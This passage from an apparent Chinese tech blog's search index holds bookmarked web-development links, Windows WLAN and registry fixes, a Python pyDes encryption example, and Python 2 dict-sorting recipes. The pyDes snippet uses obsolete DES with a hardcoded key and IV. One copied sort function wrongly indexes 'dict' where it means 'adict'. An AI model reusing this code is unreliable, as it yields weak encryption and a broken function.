href=\"http://emn178.github.io/jquery-lazyload-any/samples/youtube/\" target=\"_blank\" rel=\"noopener\">http://emn178.github.io/jquery-lazyload-any/samples/youtube/</a><br><a href=\"https://noootown.wordpress.com/2016/01/29/css-scss-tips/\" target=\"_blank\" rel=\"noopener\">https://noootown.wordpress.com/2016/01/29/css-scss-tips/</a><br><a href=\"https://react.zeef.com/nick.raienko\" target=\"_blank\" rel=\"noopener\">https://react.zeef.com/nick.raienko</a><br><a href=\"http://angryplay.blogspot.tw/2016/02/blogger-cookie-google-blogger-api-v3.html\" target=\"_blank\" rel=\"noopener\">http://angryplay.blogspot.tw/2016/02/blogger-cookie-google-blogger-api-v3.html</a><br><a href=\"https://www.youtube.com/watch?v=mQ7cgzhTiiY\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=mQ7cgzhTiiY</a><br><a href=\"http://blog.hellojcc.tw/2016/02/22/scrum-in-terms-of-developer/\" target=\"_blank\" rel=\"noopener\">http://blog.hellojcc.tw/2016/02/22/scrum-in-terms-of-developer/</a><br><a href=\"http://www.jstips.co/zh_tw/improve-nested-conditionals/\" target=\"_blank\" rel=\"noopener\">http://www.jstips.co/zh_tw/improve-nested-conditionals/</a><br><a href=\"https://csscollege.hackpad.com/CSS-2-Sass--5k6BVvbKYTf\" target=\"_blank\" rel=\"noopener\">https://csscollege.hackpad.com/CSS-2-Sass--5k6BVvbKYTf</a><br><a href=\"https://softnshare.wordpress.com/2016/02/21/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80%E9%9D%A2%E8%A9%A6%E8%80%83%E9%A1%8C%E9%9B%86%E9%8C%A6/\" target=\"_blank\" rel=\"noopener\">https://softnshare.wordpress.com/2016/02/21/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80%E9%9D%A2%E8%A9%A6%E8%80%83%E9%A1%8C%E9%9B%86%E9%8C%A6/</a><br><a href=\"https://blog.coding.net/blog/css-margin\" target=\"_blank\" rel=\"noopener\">https://blog.coding.net/blog/css-margin</a><br><a href=\"https://github.com/f2etw/f2e-notes/issues/67\" target=\"_blank\" rel=\"noopener\">https://github.com/f2etw/f2e-notes/issues/67</a><br><a href=\"http://lab.hakim.se/reveal-js/#/\" target=\"_blank\" rel=\"noopener\">http://lab.hakim.se/reveal-js/#/</a><br><a href=\"http://pymaster.logdown.com/\" target=\"_blank\" rel=\"noopener\">http://pymaster.logdown.com/</a><br><a href=\"http://muki.tw/tech/native-css-variables/\" target=\"_blank\" rel=\"noopener\">http://muki.tw/tech/native-css-variables/</a><br><a href=\"http://www.w3cplus.com/css/inline-blocks.html\" target=\"_blank\" rel=\"noopener\">http://www.w3cplus.com/css/inline-blocks.html</a><br><a href=\"http://kangax.github.io/compat-table/es5/\" target=\"_blank\" rel=\"noopener\">http://kangax.github.io/compat-table/es5/</a><br><a href=\"http://inder.com.tw/2016%E6%8E%A8%E8%96%A6%E9%96%B1%E8%AE%80%EF%BC%8D%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0react/\" target=\"_blank\" rel=\"noopener\">http://inder.com.tw/2016%E6%8E%A8%E8%96%A6%E9%96%B1%E8%AE%80%EF%BC%8D%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0react/</a><br><a href=\"http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html</a><br><a href=\"http://jimmysu.logdown.com/posts/358950-solve-blocking-alert-window\" target=\"_blank\" rel=\"noopener\">http://jimmysu.logdown.com/posts/358950-solve-blocking-alert-window</a><br><a href=\"https://noootown.wordpress.com/2016/03/18/fontend-engineer-should-know-network-structure/#more-1419\" target=\"_blank\" rel=\"noopener\">https://noootown.wordpress.com/2016/03/18/fontend-engineer-should-know-network-structure/#more-1419</a><br><a href=\"http://engmeter.blogspot.tw/2014/10/jqueryselectjquery-selectselect.html\" target=\"_blank\" rel=\"noopener\">http://engmeter.blogspot.tw/2014/10/jqueryselectjquery-selectselect.html</a><br><a href=\"http://talkerscode.com/webtricks/dynamic-select-option-menu-using-ajax-and-php.php\" target=\"_blank\" rel=\"noopener\">http://talkerscode.com/webtricks/dynamic-select-option-menu-using-ajax-and-php.php</a><br><a href=\"http://blog.dwi2.com/blog/2012/12/wheel-event-with-javascript/\" target=\"_blank\" rel=\"noopener\">http://blog.dwi2.com/blog/2012/12/wheel-event-with-javascript/</a><br><a href=\"https://regexper.com/#%28\\%28\\d{2%2C3}\\%29%29%3F\\d{3%2C4}-\\d{4}|\\d{4}-\\d{3}-\\d{3}\" target=\"_blank\" rel=\"noopener\">https://regexper.com/#%28\\%28\\d{2%2C3}\\%29%29%3F\\d{3%2C4}-\\d{4}|\\d{4}-\\d{3}-\\d{3}</a><br><a href=\"http://codemyui.tumblr.com/\" target=\"_blank\" rel=\"noopener\">http://codemyui.tumblr.com/</a><br><a href=\"https://www.youtube.com/channel/UCzuXvB2LBlBHTmkneiq-LxA\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/channel/UCzuXvB2LBlBHTmkneiq-LxA</a><br><a href=\"https://www.youtube.com/channel/UCS8f6jt01phHYKz2ysk2qyw\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/channel/UCS8f6jt01phHYKz2ysk2qyw</a><br><a href=\"http://lorempixel.com/\" target=\"_blank\" rel=\"noopener\">http://lorempixel.com/</a><br><a href=\"http://www.smalljacky.com/programming-language/php/ajax-javascript-jquery-example-for-php/\" target=\"_blank\" rel=\"noopener\">http://www.smalljacky.com/programming-language/php/ajax-javascript-jquery-example-for-php/</a><br><a href=\"http://oreilly-generator.com/\" target=\"_blank\" rel=\"noopener\">http://oreilly-generator.com/</a><br><a href=\"http://quilljs.com/\" target=\"_blank\" rel=\"noopener\">http://quilljs.com/</a><br><a href=\"http://it-life.wyx-ccy.com/2016/04/php-gd.html\" target=\"_blank\" rel=\"noopener\">http://it-life.wyx-ccy.com/2016/04/php-gd.html</a><br><a href=\"http://163.17.145.129/teacher/mmdhf/WEB-64/s18984106.pdf\" target=\"_blank\" rel=\"noopener\">http://163.17.145.129/teacher/mmdhf/WEB-64/s18984106.pdf</a><br><a href=\"http://blog.xdite.net/posts/2012/01/29/css-tricks-summary/\" target=\"_blank\" rel=\"noopener\">http://blog.xdite.net/posts/2012/01/29/css-tricks-summary/</a><br><a href=\"http://momentjs.com/\" target=\"_blank\" rel=\"noopener\">http://momentjs.com/</a><br><a href=\"https://developers.google.com/web/fundamentals/design-and-ui/animations/css-vs-javascript?hl=zh-tw\" target=\"_blank\" rel=\"noopener\">https://developers.google.com/web/fundamentals/design-and-ui/animations/css-vs-javascript?hl=zh-tw</a><br><a href=\"http://teahour.fm/2015/08/16/vuejs-creator-evan-you.html\" target=\"_blank\" rel=\"noopener\">http://teahour.fm/2015/08/16/vuejs-creator-evan-you.html</a><br><a href=\"http://julian.com/research/velocity/\" target=\"_blank\" rel=\"noopener\">http://julian.com/research/velocity/</a><br><a href=\"http://tympanus.net/codrops/collective/collective-216/\" target=\"_blank\" rel=\"noopener\">http://tympanus.net/codrops/collective/collective-216/</a><br><a href=\"http://stackoverflow.com/questions/6867254/browsers-default-css-for-html-elements\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/6867254/browsers-default-css-for-html-elements</a><br><a href=\"http://highslide.com/\" target=\"_blank\" rel=\"noopener\">http://highslide.com/</a><br><a href=\"http://tianweili.github.io/blog/2015/03/02/singleton-pattern/\" target=\"_blank\" rel=\"noopener\">http://tianweili.github.io/blog/2015/03/02/singleton-pattern/</a><br><a href=\"https://bng86.gitbooks.io/android-third-party-/content/realm.html\" target=\"_blank\" rel=\"noopener\">https://bng86.gitbooks.io/android-third-party-/content/realm.html</a><br><a href=\"http://www.css88.com/book/css/\" target=\"_blank\" rel=\"noopener\">http://www.css88.com/book/css/</a><br><a href=\"https://dotblogs.com.tw/yc421206/archive/2012/10/01/75212.aspx\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/yc421206/archive/2012/10/01/75212.aspx</a><br><a href=\"http://abgne.tw/jquery/apply-jquery/jquery-scroll-to-page-top.html\" target=\"_blank\" rel=\"noopener\">http://abgne.tw/jquery/apply-jquery/jquery-scroll-to-page-top.html</a><br><a href=\"http://easings.net/zh-tw\" target=\"_blank\" rel=\"noopener\">http://easings.net/zh-tw</a><br><a href=\"http://www.w3schools.com/css/exercise.asp?filename=exercise_css3_3dtransforms1\" target=\"_blank\" rel=\"noopener\">http://www.w3schools.com/css/exercise.asp?filename=exercise_css3_3dtransforms1</a><br><a href=\"http://www.chinaz.com/design/2012/1130/284263.shtml\" target=\"_blank\" rel=\"noopener\">http://www.chinaz.com/design/2012/1130/284263.shtml</a><br><a href=\"http://www.w3cfuns.com/notes/15477/fea046b6226c917c22900f00f644ce9c\" target=\"_blank\" rel=\"noopener\">http://www.w3cfuns.com/notes/15477/fea046b6226c917c22900f00f644ce9c</a><br><a href=\"https://cn.vuejs.org/guide/comparison.html#Angular\" target=\"_blank\" rel=\"noopener\">https://cn.vuejs.org/guide/comparison.html#Angular</a><br><a href=\"http://www.puritys.me/docs-blog/article-31-CSS-%E8%AA%9E%E6%B3%95%EF%BC%8C%E6%96%87%E5%AD%97%E6%8F%9B%E8%A1%8C%EF%BC%8C%E5%BC%B7%E8%BF%AB%E4%B8%8D%E6%8F%9B%E8%A1%8C%E3%80%82.html\" target=\"_blank\" rel=\"noopener\">http://www.puritys.me/docs-blog/article-31-CSS-%E8%AA%9E%E6%B3%95%EF%BC%8C%E6%96%87%E5%AD%97%E6%8F%9B%E8%A1%8C%EF%BC%8C%E5%BC%B7%E8%BF%AB%E4%B8%8D%E6%8F%9B%E8%A1%8C%E3%80%82.html</a><br><a href=\"https://jmperezperez.com/medium-image-progressive-loading-placeholder/\" target=\"_blank\" rel=\"noopener\">https://jmperezperez.com/medium-image-progressive-loading-placeholder/</a><br><a href=\"http://colinued.leanote.com/post/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF-%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%BC%8F\" target=\"_blank\" rel=\"noopener\">http://colinued.leanote.com/post/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF-%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%BC%8F</a><br><a href=\"http://www.jqueryscript.net/other/jQuery-Plugin-For-Smart-Image-Loading-Progressive-Image.html\" target=\"_blank\" rel=\"noopener\">http://www.jqueryscript.net/other/jQuery-Plugin-For-Smart-Image-Loading-Progressive-Image.html</a><br><a href=\"http://www.jqueryscript.net/other/jQuery-Plugin-For-Smart-Image-Loading-Progressive-Image.html\" target=\"_blank\" rel=\"noopener\">http://www.jqueryscript.net/other/jQuery-Plugin-For-Smart-Image-Loading-Progressive-Image.html</a><br><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=14&amp;id=115503&amp;sty=1&amp;tpg=2&amp;age=-1\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?bid=14&amp;id=115503&amp;sty=1&amp;tpg=2&amp;age=-1</a><br><a href=\"https://blog.fntsr.tw/articles/2013/12/15/sublime-text-2/\" target=\"_blank\" rel=\"noopener\">https://blog.fntsr.tw/articles/2013/12/15/sublime-text-2/</a><br><a href=\"http://mao.li/javascript/javascript-callback-function/\" target=\"_blank\" rel=\"noopener\">http://mao.li/javascript/javascript-callback-function/</a><br><a href=\"http://vanilla-js.com/\" target=\"_blank\" rel=\"noopener\">http://vanilla-js.com/</a><br><a href=\"http://www.mattboldt.com/demos/typed-js/\" target=\"_blank\" rel=\"noopener\">http://www.mattboldt.com/demos/typed-js/</a></p>\n<p><a href=\"http://blog.kkbruce.net/2012/02/javascript-w3c-dom.html\" target=\"_blank\" rel=\"noopener\">http://blog.kkbruce.net/2012/02/javascript-w3c-dom.html</a><br><a href=\"http://blog.kkbruce.net/2012/02/javascript-w3c-dom.html\" target=\"_blank\" rel=\"noopener\">http://blog.kkbruce.net/2012/02/javascript-w3c-dom.html</a><br><a href=\"https://www.web-tinker.com/article/21244.html\" target=\"_blank\" rel=\"noopener\">https://www.web-tinker.com/article/21244.html</a><br><a href=\"http://www.cnblogs.com/jscode/archive/2012/09/04/2670819.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/jscode/archive/2012/09/04/2670819.html</a><br><a href=\"http://www.slideshare.net/sfismy/ss-23649630?next_slideshow=1\" target=\"_blank\" rel=\"noopener\">http://www.slideshare.net/sfismy/ss-23649630?next_slideshow=1</a><br><a href=\"http://csscoke.com/\" target=\"_blank\" rel=\"noopener\">http://csscoke.com/</a><br><a href=\"https://www.udemy.com/sublime-text3/\" target=\"_blank\" rel=\"noopener\">https://www.udemy.com/sublime-text3/</a><br><a href=\"http://kingfff.blogspot.tw/2011/11/putty-login-execute-ssh-batch.html\" target=\"_blank\" rel=\"noopener\">http://kingfff.blogspot.tw/2011/11/putty-login-execute-ssh-batch.html</a><br><a href=\"http://www.xiaomastack.com/2015/07/04/zabbix-auto-tcp-port/\" target=\"_blank\" rel=\"noopener\">http://www.xiaomastack.com/2015/07/04/zabbix-auto-tcp-port/</a><br><a href=\"http://www.puritys.me/docs-blog/article-242-Javascript-Hoisting-%E8%88%87-Closure.html\" target=\"_blank\" rel=\"noopener\">http://www.puritys.me/docs-blog/article-242-Javascript-Hoisting-%E8%88%87-Closure.html</a><br><a href=\"https://branded.me/greenharry/resources-to-learn-ecmascript-6-javascript-6\" target=\"_blank\" rel=\"noopener\">https://branded.me/greenharry/resources-to-learn-ecmascript-6-javascript-6</a><br><a href=\"http://i-ming-blog.blogspot.tw/2015/02/raspberry-pi-arduino-via-usb.html\" target=\"_blank\" rel=\"noopener\">http://i-ming-blog.blogspot.tw/2015/02/raspberry-pi-arduino-via-usb.html</a><br><a href=\"http://ming-shian.blogspot.tw/p/arduino.html\" target=\"_blank\" rel=\"noopener\">http://ming-shian.blogspot.tw/p/arduino.html</a><br><a href=\"http://www.slideshare.net/marygeek/rwd-43180178?next_slideshow=2\" target=\"_blank\" rel=\"noopener\">http://www.slideshare.net/marygeek/rwd-43180178?next_slideshow=2</a><br><a href=\"https://gist.github.com/yaqxyaqx/6239870\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/yaqxyaqx/6239870</a><br><a href=\"http://www.victsao.com/blog/224-javascript-hoisting\" target=\"_blank\" rel=\"noopener\">http://www.victsao.com/blog/224-javascript-hoisting</a><br><a href=\"http://blog.kkbruce.net/2015/10/webpack.html\" target=\"_blank\" rel=\"noopener\">http://blog.kkbruce.net/2015/10/webpack.html</a><br><a href=\"https://www.mockaroo.com/\" target=\"_blank\" rel=\"noopener\">https://www.mockaroo.com/</a><br><a href=\"https://www.zhihu.com/question/37020798\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/37020798</a><br><a href=\"http://www.cnblogs.com/fsong/p/4029941.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/fsong/p/4029941.html</a><br><a href=\"http://ngrowup.blogspot.tw/2012/09/php_27.html\" target=\"_blank\" rel=\"noopener\">http://ngrowup.blogspot.tw/2012/09/php_27.html</a><br><a href=\"http://xyz.cinc.biz/2011/01/php.html\" target=\"_blank\" rel=\"noopener\">http://xyz.cinc.biz/2011/01/php.html</a><br><a href=\"http://www.victsao.com/blog/81-javascript/302-javascript-function-closure-variable\" target=\"_blank\" rel=\"noopener\">http://www.victsao.com/blog/81-javascript/302-javascript-function-closure-variable</a><br><a href=\"http://www.victsao.com/blog/81-javascript/286-javascript-function\" target=\"_blank\" rel=\"noopener\">http://www.victsao.com/blog/81-javascript/286-javascript-function</a><br><a href=\"https://www.youtube.com/channel/UCdhl9wtLllY64-sGhs_OEVQ/playlists\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/channel/UCdhl9wtLllY64-sGhs_OEVQ/playlists</a><br><a href=\"http://www.slideshare.net/raspberrypi-tw/gpio-gameconsolestarterkit\" target=\"_blank\" rel=\"noopener\">http://www.slideshare.net/raspberrypi-tw/gpio-gameconsolestarterkit</a><br><a href=\"https://mlwmlw.org/2015/07/%E6%B7%B1%E5%85%A5%E6%B7%BA%E5%87%BA-wifi-%E6%99%B6%E7%89%87-esp8266-with-arduino/\" target=\"_blank\" rel=\"noopener\">https://mlwmlw.org/2015/07/%E6%B7%B1%E5%85%A5%E6%B7%BA%E5%87%BA-wifi-%E6%99%B6%E7%89%87-esp8266-with-arduino/</a><br><a href=\"http://blog.darkthread.net/post-2016-05-26-x-ua-compatible-setting.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2016-05-26-x-ua-compatible-setting.aspx</a><br><a href=\"https://read01.com/g6OmO.html\" target=\"_blank\" rel=\"noopener\">https://read01.com/g6OmO.html</a><br><a href=\"http://jamestw.logdown.com/posts/245735-through-the-jshint-to-help-you-improve-the-quality-of-program-code-using-linter-in-atom\" target=\"_blank\" rel=\"noopener\">http://jamestw.logdown.com/posts/245735-through-the-jshint-to-help-you-improve-the-quality-of-program-code-using-linter-in-atom</a><br><a href=\"http://www.jqueryrain.com/demo/3d-slider-carousel/\" target=\"_blank\" rel=\"noopener\">http://www.jqueryrain.com/demo/3d-slider-carousel/</a><br><a href=\"http://www.hksilicon.com/articles/82778\" target=\"_blank\" rel=\"noopener\">http://www.hksilicon.com/articles/82778</a><br><a href=\"http://aqr199xx.pixnet.net/blog/post/25269009-jquery%E7%9A%84extend\" target=\"_blank\" rel=\"noopener\">http://aqr199xx.pixnet.net/blog/post/25269009-jquery%E7%9A%84extend</a><br><a href=\"http://hushicai.com/2014/03/02/jquery-zheng-ti-jia-gou.html\" target=\"_blank\" rel=\"noopener\">http://hushicai.com/2014/03/02/jquery-zheng-ti-jia-gou.html</a></p>\n","categories":["網站記錄"]},{"title":"Bower前端套件管理工具","url":"/blog/2014/12/24/logdown/2014-12-24-bower-front-end-package-management-tool/","content":"<p>參考來源：<br>Gulp, Grunt, Bower以及npm<br><a href=\"http://blog.darkthread.net/post-2014-09-25-gulp-grunt-bower-npm.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2014-09-25-gulp-grunt-bower-npm.aspx</a></p>\n<p>Bower 前端套件管理工具<br><a href=\"http://edentsai231.logdown.com/posts/198741-bower-front-end-kit-management-tool\" target=\"_blank\" rel=\"noopener\">http://edentsai231.logdown.com/posts/198741-bower-front-end-kit-management-tool</a></p>\n<p>Day 1: Bower —— 管理你的客戶端依賴關係<br><a href=\"http://segmentfault.com/a/1190000000349555\" target=\"_blank\" rel=\"noopener\">http://segmentfault.com/a/1190000000349555</a></p>\n","categories":["網站記錄"]},{"title":"wifi抓到驅動但不能連wifi","url":"/blog/2015/01/26/logdown/2015-01-26-wifi-caught-driving-but-not-even-wifi/","content":"<p>今天幫主任重灌筆電，由於是用我同學整合的Win7安裝<br>發現驅動抓到無線網卡，但無線網卡沒法找無線Wifi</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.點擊開始菜單，在搜索欄中輸入「services.msc」（輸入時不要打引號），並按下回車。如果此時彈出用戶賬戶控制窗口，請您點擊「繼續」。</span><br><span class=\"line\">2.分別按順序雙擊打開&quot;CNG Key Isolation&quot; &quot;Extensible Authentication Protocol&quot; &quot;WLAN AutoConfig&quot;服務。點擊「常規」選項卡，確保「啟動類型」是「自動」或者「手動」。然後點擊「服務狀態」下面的「啟用」按鈕。</span><br><span class=\"line\"></span><br><span class=\"line\">或者手動啟動三個服務</span><br><span class=\"line\">1.</span><br><span class=\"line\">&quot;CNG Key Isolation&quot;</span><br><span class=\"line\">2.</span><br><span class=\"line\">&quot;Extensible Authentication Protocol&quot;</span><br><span class=\"line\">3.</span><br><span class=\"line\">&quot;WLAN AutoConfig&quot;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://rossic0989.pixnet.net/blog/post/29726514-%E7%84%A1%E6%B3%95%E5%95%9F%E5%8B%95wlan-autoconfig%E9%8C%AF%E8%AA%A4%E4%BB%A3%E7%A2%BC1068%28win7%29\" target=\"_blank\" rel=\"noopener\">http://rossic0989.pixnet.net/blog/post/29726514-%E7%84%A1%E6%B3%95%E5%95%9F%E5%8B%95wlan-autoconfig%E9%8C%AF%E8%AA%A4%E4%BB%A3%E7%A2%BC1068%28win7%29</a></p>\n<p>結果是我同學Win7整合服務關掉orz<br>讓我搞這麼久</p>\n","categories":["Windows"],"tags":["wifi","驅動","不能連wifi"]},{"title":"[Python]正規化complie用法","url":"/blog/2015/04/26/logdown/2015-04-26-python-the-normalised-complie-usage/","content":"<p><a href=\"http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html</a></p>\n","categories":["Python"]},{"title":"Win7 的視窗閃動、間歇地出現\"沒有回應\" ","url":"/blog/2015/03/07/logdown/2015-03-07-win7-is-window-flashing-intermittent-appear-not-responding/","content":"<p>最近同學幫別人灌電腦遇到Win7裡的Office會有閃爍的問題<br>結果Google一下，還真的可以解決!!!<br>記錄一下，說不定哪天就用到了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">一些 電腦優化程序 可能會把 電腦的關閉( Shutdown?? )速度 增加 ，</span><br><span class=\"line\">Win7 的視窗閃動、間歇地出現&quot;沒有回應&quot; ( 並非螢幕黑屏 ) 問題多數是由這所引起的 。</span><br><span class=\"line\"></span><br><span class=\"line\">解 :</span><br><span class=\"line\">1 按左下角的&quot;開始&quot;，輸入 &quot;regedit&quot; ，開 &quot;regedit.exe&quot;，</span><br><span class=\"line\">   程式的左方應包含一 &quot;資料夾選巴&quot;。</span><br><span class=\"line\"></span><br><span class=\"line\">2 在選巴中選 &quot; HKEY_USERS \\ .DEFAULT \\ Control Panel \\ Desktop &quot;，</span><br><span class=\"line\">   程式的右方應出現一些 &quot;登錄值&quot; ，包含 名稱、類型、資料 等。</span><br><span class=\"line\"></span><br><span class=\"line\">3 在 &quot;登錄值&quot; 中選取 &quot; HungAppTimeOut &quot; 和 &quot; WaitToKillAppTimeOut &quot;，點右鍵刪除。</span><br><span class=\"line\"></span><br><span class=\"line\">4 在選巴中選 &quot; HKEY_CURRENT_USER \\ Control Panel \\ Desktop &quot;。</span><br><span class=\"line\"></span><br><span class=\"line\">5 在 &quot;登錄值&quot; 中選取 &quot; HungAppTimeOut &quot;、&quot; WaitToKillAppTimeOut &quot;、&quot; WaitToKillServiceTimeOut &quot;，點右鍵刪除。</span><br><span class=\"line\"></span><br><span class=\"line\">略解 :</span><br><span class=\"line\">1 開 登錄編輯程式( Registry Editor ) 。</span><br><span class=\"line\"></span><br><span class=\"line\">2 刪除 &quot; HKEY_USERS \\ .DEFAULT \\ Control Panel \\ Desktop &quot; 中的 (&quot; HungAppTimeOut &quot;、&quot; WaitToKillAppTimeOut &quot;)。</span><br><span class=\"line\"></span><br><span class=\"line\">3 刪除 &quot; HKEY_CURRENT_USER \\ Control Panel \\ Desktop &quot; 中的 (&quot; HungAppTimeOut &quot;、&quot; WaitToKillAppTimeOut &quot;、&quot; WaitToKillServiceTimeOut &quot;)。</span><br><span class=\"line\"></span><br><span class=\"line\">若發現此解適用於其它作業系統 ，請下報。</span><br><span class=\"line\"></span><br><span class=\"line\">參自 : www.mydigitallife.info</span><br></pre></td></tr></table></figure>\n<p>參考來源：<br>Windows7 視窗、畫面、遊戲程式 閃動問題 解決辦法<br><a href=\"https://groups.google.com/forum/#!topic/computer_resuce/rDn_21bC2Lk\" target=\"_blank\" rel=\"noopener\">https://groups.google.com/forum/#!topic/computer_resuce/rDn_21bC2Lk</a></p>\n","categories":["Windows"],"tags":["視窗閃動"]},{"title":"[Python]使用pyDes.py動態加密解密","url":"/blog/2015/04/26/logdown/2015-04-26-python-use-pydespy-encryption-and-decryption/","content":"<p><a href=\"https://github.com/toddw-as/pyDes\" target=\"_blank\" rel=\"noopener\">pyDes Github</a></p>\n<figure class=\"highlight python\"><figcaption><span>test_pyDes.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pyDes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">data =str(random.random())+<span class=\"string\">\"|\"</span>+<span class=\"string\">\"加密內容\"</span></span><br><span class=\"line\">k = des(<span class=\"string\">'DESCRYPT'</span>, CBC, <span class=\"string\">'12345675'</span>, pad=<span class=\"keyword\">None</span>, padmode=PAD_PKCS5)</span><br><span class=\"line\">d = k.encrypt(data)</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Encrypted: %r\"</span> % base64.b64encode(d)</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Decrypted: %r\"</span> % k.decrypt(d)</span><br></pre></td></tr></table></figure>","categories":["Python"]},{"title":"[Python]dict排序筆記","url":"/blog/2015/05/04/logdown/2015-05-04-pythondict-sort-records/","content":"<p>最近突然想到以前有在網路看到Dict做排序<br>覺得這些以後還用的到<br>所以記錄一下…</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#http://www.saltycrane.com/blog/2007/09/how-to-sort-python-dictionary-by-keys/</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> sorted(mydict.iterkeys()):</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s: %s\"</span> % (key, mydict[key])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> key, value <span class=\"keyword\">in</span> sorted(mydict.iteritems(), key=<span class=\"keyword\">lambda</span> (k,v): (v,k)):</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s: %s\"</span> % (key, value)</span><br></pre></td></tr></table></figure>\n<p>寫成現有method<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#http://code.activestate.com/recipes/52306-to-sort-a-dictionary/</span></span><br><span class=\"line\">    <span class=\"comment\"># (IMHO) the simplest approach:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sortedDictValues1</span><span class=\"params\">(adict)</span>:</span></span><br><span class=\"line\">        items = adict.items()</span><br><span class=\"line\">        items.sort()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> [value <span class=\"keyword\">for</span> key, value <span class=\"keyword\">in</span> items]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># an alternative implementation, which</span></span><br><span class=\"line\">    <span class=\"comment\"># happens to run a bit faster for large</span></span><br><span class=\"line\">    <span class=\"comment\"># dictionaries on my machine:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sortedDictValues2</span><span class=\"params\">(adict)</span>:</span></span><br><span class=\"line\">        keys = adict.keys()</span><br><span class=\"line\">        keys.sort()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> [dict[key] <span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> keys]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># a further slight speed-up on my box</span></span><br><span class=\"line\">    <span class=\"comment\"># is to map a bound-method:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sortedDictValues3</span><span class=\"params\">(adict)</span>:</span></span><br><span class=\"line\">        keys = adict.keys()</span><br><span class=\"line\">        keys.sort()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> map(adict.get, keys)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#http://falldog7.blogspot.com/2009/10/python-dictionary-or-classitemlistsort.html</span></span><br><span class=\"line\">    d= [ &#123;<span class=\"string\">'id'</span>:<span class=\"number\">0</span>, <span class=\"string\">'value'</span>:<span class=\"number\">9</span>&#125;, &#123;<span class=\"string\">'id'</span>:<span class=\"number\">1</span>, <span class=\"string\">'value'</span>:<span class=\"number\">100</span>&#125;, &#123;<span class=\"string\">'id'</span>:<span class=\"number\">5</span>, <span class=\"string\">'value'</span>:<span class=\"number\">99</span>&#125;, &#123;<span class=\"string\">'id'</span>:<span class=\"number\">3</span>, <span class=\"string\">'value'</span>:<span class=\"number\">19</span>&#125;, &#123;<span class=\"string\">'id'</span>:<span class=\"number\">2</span>, <span class=\"string\">'value'</span>:<span class=\"number\">59</span>&#125; ]</span><br><span class=\"line\">    d.sort(key=<span class=\"keyword\">lambda</span> x:x[<span class=\"string\">'id'</span>]) <span class=\"comment\">#針對key 'id' 做sort</span></span><br><span class=\"line\">    d.sort(key=<span class=\"keyword\">lambda</span> x:x[<span class=\"string\">'value'</span>]) <span class=\"comment\">#針對key 'value' 做sort</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#以下用cmp，可以達到上面指定key的效果</span></span><br><span class=\"line\">    d.sort(cmp=<span class=\"keyword\">lambda</span> x,y: cmp(x[<span class=\"string\">'id'</span>], y[<span class=\"string\">'id'</span>]))</span><br><span class=\"line\">    d.sort(cmp=<span class=\"keyword\">lambda</span> x,y: cmp(x[<span class=\"string\">'value'</span>], y[<span class=\"string\">'value'</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span 